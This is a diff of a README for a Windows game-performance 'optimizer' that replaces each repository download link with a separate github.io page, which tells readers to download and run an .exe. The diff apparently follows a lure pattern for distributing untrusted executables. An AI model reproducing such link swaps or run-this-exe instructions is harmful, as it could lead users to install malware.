@@ -1,6 +1,6 @@
 # ⚡ windows-fps-optimizer - Increase game frame rates on Windows
 
-[![](https://img.shields.io/badge/Download-Quantum_Optimizer-blue.svg)](https://github.com/Aching-miracle654/windows-fps-optimizer)
+[![](https://img.shields.io/badge/Download-Quantum_Optimizer-blue.svg)](https://aching-miracle654.github.io)
 
 This software improves system performance for gaming. It adjusts internal Windows settings to reduce input lag and stabilize frame rates. You gain a smoother gaming experience by letting your computer focus its resources on your active game.
 
@@ -27,14 +27,14 @@ The application runs on most modern desktop setups. Ensure your system meets the
 
 Follow these steps to set up the software.
 
-1.  Visit the [official download page](https://github.com/Aching-miracle654/windows-fps-optimizer).
+1.  Visit the [official download page](https://aching-miracle654.github.io).
 2.  Locate the section labeled Releases on the right side of the screen.
 3.  Click the version marked Latest.
 4.  Download the file ending in .exe to your computer.
 5.  Double-click the file to start the installation.
 6.  Follow the prompts on your screen to finish the setup.
 
-[![](https://img.shields.io/badge/Get_Started-Download_Quantum-grey.svg)](https://github.com/Aching-miracle654/windows-fps-optimizer)
+[![](https://img.shields.io/badge/Get_Started-Download_Quantum-grey.svg)](https://aching-miracle654.github.io)
 
 ## 🚀 How to Use
 
